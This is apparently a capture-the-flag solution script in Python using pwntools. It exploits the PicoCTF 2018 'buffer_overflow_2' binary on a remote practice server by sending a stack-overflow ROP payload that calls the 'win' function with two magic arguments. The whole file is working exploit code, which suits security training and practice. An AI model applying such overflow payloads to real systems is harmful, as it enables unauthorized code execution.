from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../PicoCTF_2018_buffer_overflow_2')
target = remote('node4.buuoj.cn', 28131)

magic1 = 0xDEADBEEF
magic2 = 0xDEADC0DE

get_flag = elf.sym['win']

payload = utils.create_rop_payload(0x6c, {magic1: [], magic2: []}, 'i386', get_flag)
target.sendlineafter('string:', payload)
target.interactive()
